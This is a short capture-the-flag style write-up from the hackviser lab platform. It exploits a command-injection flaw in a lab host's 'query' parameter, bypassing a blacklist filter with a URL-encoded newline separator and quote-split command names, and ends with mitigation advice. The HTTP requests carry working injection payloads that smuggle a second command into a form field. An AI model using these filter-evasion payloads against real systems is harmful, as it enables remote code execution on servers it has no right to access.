# Command Injection with Advanced Filter Bypass

## 🎯 Objective
Bypass comprehensive input filters to exploit a command injection vulnerability and execute arbitrary system commands.

## 🔍 Vulnerability Analysis
- **Type**: Command Injection with multi-layered filtering
- **Target**: `https://inviting-mysterio.apac01.hackviser.space`
- **Parameter**: `query` (POST request)
- **Filter Mechanism**: Blacklist of common command names and operators
- **Impact**: Remote code execution with web server privileges

## 💥 Exploitation Process

### Initial Reconnaissance
```http
POST / HTTP/1.1
Host: inviting-mysterio.apac01.hackviser.space
Content-Type: application/x-www-form-urlencoded

query=google.com;hostname
Result: Filter blocked semicolon operator

Bypass Development
Technique 1: Alternative command separator

%0A (newline character) not filtered

Payload: google.com%0Ahostname

Technique 2: Command obfuscation

String concatenation bypasses keyword detection

h"o"st"na"me → interpreted as hostname

Final Payload
http
POST / HTTP/1.1
Host: inviting-mysterio.apac01.hackviser.space
Content-Type: application/x-www-form-urlencoded

query=google.com%0Ah"o"st"na"me
Result: Successfully executed hostname, returning mutuality

🛡️ Mitigation Strategies
Input Validation: Whitelist-based validation instead of blacklisting

Parameterized Commands: Use subprocess with argument arrays

Context-Aware Sanitization: Language-specific secure coding practices

Regular Expression Auditing: Comprehensive testing of filter patterns

📊 Skills Demonstrated
Filter Evasion: Multi-technique approach to bypass security controls

Character Encoding: Leveraging URL encoding for payload delivery

String Obfuscation: Using concatenation to evade keyword detection

Defense Analysis: Understanding limitations of simple filtering approaches

Conducted in controlled environment for educational purposes
